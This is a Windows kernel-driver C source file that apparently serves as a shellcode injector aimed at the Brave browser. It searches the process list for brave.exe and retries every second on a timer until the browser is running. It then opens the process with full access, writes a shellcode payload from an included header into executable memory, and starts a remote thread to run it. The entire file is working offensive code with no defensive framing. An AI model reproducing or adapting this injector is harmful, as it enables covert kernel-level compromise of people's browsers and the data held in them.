
#include <ntifs.h>
#include <ntimage.h>
#include "includes/injectors utils/poolget.hh"
#include "includes/injectors utils/shellcode.h"
#include "includes/injectors utils/Structure.hh"
#include "includes/injectors utils/roles.hh"


NTSTATUS RunAutoInjection(VOID);


static VOID KernelApcRoutine(
    PKAPC             Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID*            NormalContext,
    PVOID*            SystemArgument1,
    PVOID*            SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    ExFreePool(Apc);
}


static NTSTATUS FindPidByName(WCHAR* processName, ULONG* pid)
{
    NTSTATUS             status;
    PSYSTEM_PROCESS_INFO originalInfo = NULL;
    PSYSTEM_PROCESS_INFO info         = NULL;
    ULONG                infoSize     = 0;

    if (!pid || !processName)
        return STATUS_INVALID_PARAMETER;

    status = ZwQuerySystemInformation(5, NULL, 0, &infoSize);

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (originalInfo)
            ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        originalInfo = (PSYSTEM_PROCESS_INFO)AllocateMemory(infoSize, TRUE);
        if (!originalInfo) break;
        status = ZwQuerySystemInformation(5,
            originalInfo, infoSize, &infoSize);
    }

    if (!NT_SUCCESS(status) || !originalInfo)
    {
        if (!originalInfo) status = STATUS_INSUFFICIENT_RESOURCES;
        else ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        return status;
    }

    info = originalInfo;
    while (info->NextEntryOffset)
    {
        if (info->ImageName.Buffer && info->ImageName.Length > 0)
        {
            if (_wcsicmp(info->ImageName.Buffer, processName) == 0)
            {
                *pid = HandleToULong(info->UniqueProcessId);
                break;
            }
        }
        info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
    }

    ExFreePoolWithTag(originalInfo, DRIVER_TAG);
    return status;
}


typedef NTSTATUS (NTAPI *PZW_CREATE_THREAD_EX)(
    OUT PHANDLE            ThreadHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
    IN  HANDLE             ProcessHandle,
    IN  PVOID              StartRoutine,
    IN  PVOID              Argument          OPTIONAL,
    IN  ULONG              CreateFlags,
    IN  ULONG_PTR          ZeroBits,
    IN  ULONG_PTR          StackSize,
    IN  ULONG_PTR          MaximumStackSize,
    IN  PVOID              AttributeList     OPTIONAL);

static NTSTATUS CreateSystemThreadInProcess(HANDLE hProcess, PVOID StartAddress)
{
    HANDLE         hThread = NULL;
    PVOID          orig    = NULL;
    UNICODE_STRING funcName;
    NTSTATUS       status;

    RtlInitUnicodeString(&funcName, L"ZwCreateThreadEx");
    orig = MmGetSystemRoutineAddress(&funcName);

    if (!orig)
    {
        static BOOLEAN bInit = FALSE;
        if (!bInit)
        {
            NTSTATUS initStatus = NTDLL_Initialize();
            if (NT_SUCCESS(initStatus)) bInit = TRUE;
        }
        if (bInit)
            orig = GetFunctionAddress("NtCreateThreadEx");
    }

    if (!orig)
    {
        DbgPrint("[inject] ZwCreateThreadEx not found\n");
        return STATUS_PROCEDURE_NOT_FOUND;
    }

    status = ((PZW_CREATE_THREAD_EX)(ULONG_PTR)orig)(
        &hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (PVOID)(ULONG_PTR)StartAddress, NULL, 0, 0, 0, 0, NULL);

    if (NT_SUCCESS(status))
    {
        DbgPrint("[inject] Thread created %p\n", hThread);
        ZwClose(hThread);
    }
    else
    {
        DbgPrint("[inject] CreateThread failed 0x%X\n", status);
    }
    return status;
}


static NTSTATUS InjectShellcode(
    HANDLE hProcess, ULONG pid, PVOID pShellcode, SIZE_T shellcodeSize)
{
    NTSTATUS   status;
    PVOID      remoteBuffer  = NULL;
    PEPROCESS  targetProcess = NULL;
    KAPC_STATE apcState;
    SIZE_T     sz = shellcodeSize;

    UNREFERENCED_PARAMETER(pid);

    DbgPrint("[inject] pid=%lu size=%llu\n", pid, shellcodeSize);

    status = ZwAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &sz,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[inject] ZwAllocateVirtualMemory 0x%X\n", status);
        return status;
    }

    status = ObReferenceObjectByHandle(hProcess, PROCESS_ALL_ACCESS,
        *PsProcessType, KernelMode, (PVOID*)&targetProcess, NULL);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[inject] ObReferenceObjectByHandle 0x%X\n", status);
        return status;
    }

    KeStackAttachProcess(targetProcess, &apcState);

    {
        SIZE_T bytesCopied = 0;
        status = MmCopyVirtualMemory(PsGetCurrentProcess(), pShellcode,
            targetProcess, remoteBuffer, sz, KernelMode, &bytesCopied);

        if (NT_SUCCESS(status))
        {
            PVOID  protAddr = remoteBuffer;
            SIZE_T protSize = sz;
            ULONG  oldProt  = 0;
            ZwProtectVirtualMemory(hProcess, &protAddr, &protSize,
                PAGE_EXECUTE_READ, &oldProt);
            DbgPrint("[inject] Copied %llu bytes\n", bytesCopied);
        }
        else
        {
            DbgPrint("[inject] MmCopyVirtualMemory 0x%X\n", status);
        }
    }

    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(targetProcess);

    if (!NT_SUCCESS(status))
        return status;

    return CreateSystemThreadInProcess(hProcess, remoteBuffer);
}


static VOID PerformBackgroundTasks(void)
{
    ULONG kernelSize = 0;
    PVOID kernelBase = GetKernelBaseCleaner(&kernelSize);
    if (kernelBase)
    {
        p_driver->ul_ntos_krnl_base = (ULONG_PTR)kernelBase;
        p_driver->ul_ntos_krnl_size = kernelSize;
    }
}


static NTSTATUS PerformInjection(ULONG pid)
{
    HANDLE            hProcess = NULL;
    CLIENT_ID         clientId;
    OBJECT_ATTRIBUTES objAttr;
    NTSTATUS          status;

    DbgPrint("[inject] PerformInjection pid=%lu\n", pid);

    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    clientId.UniqueThread  = NULL;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[inject] ZwOpenProcess pid=%lu 0x%X\n", pid, status);
        return status;
    }

    status = InjectShellcode(hProcess, pid,
        (PVOID)shellcode, sizeof(shellcode));

    DbgPrint("[inject] pid=%lu status=0x%X\n", pid, status);
    ZwClose(hProcess);
    return status;
}


static KTIMER          g_Timer;
static KDPC            g_Dpc;
static WORK_QUEUE_ITEM g_WorkItem;

static VOID DpcRoutine(
    struct _KDPC* Dpc,
    PVOID         DeferredContext,
    PVOID         SystemArgument1,
    PVOID         SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    ExQueueWorkItem(&g_WorkItem, DelayedWorkQueue);
}

static VOID WorkItemRoutine(PVOID Parameter)
{
    ULONG         pid = 0;
    LARGE_INTEGER interval;

    UNREFERENCED_PARAMETER(Parameter);

    FindPidByName(L"brave.exe", &pid);
    if (pid)
    {
        PerformInjection(pid);
        PerformBackgroundTasks();
    }
    else
    {
        interval.QuadPart = -10000000LL; 
        KeSetTimer(&g_Timer, interval, &g_Dpc);
    }
}


NTSTATUS RunAutoInjection(void)
{
    ULONG         pid = 0;
    LARGE_INTEGER interval;

    GetWindowsVersion();
    NTDLL_Initialize();

    FindPidByName(L"brave.exe", &pid);
    if (pid)
    {
        PerformInjection(pid);
        PerformBackgroundTasks();
        return STATUS_SUCCESS;
    }

    KeInitializeTimer(&g_Timer);
    KeInitializeDpc(&g_Dpc, DpcRoutine, NULL);
    ExInitializeWorkItem(&g_WorkItem, WorkItemRoutine, NULL);

    interval.QuadPart = -10000000LL;
    KeSetTimer(&g_Timer, interval, &g_Dpc);

    return STATUS_SUCCESS;
}
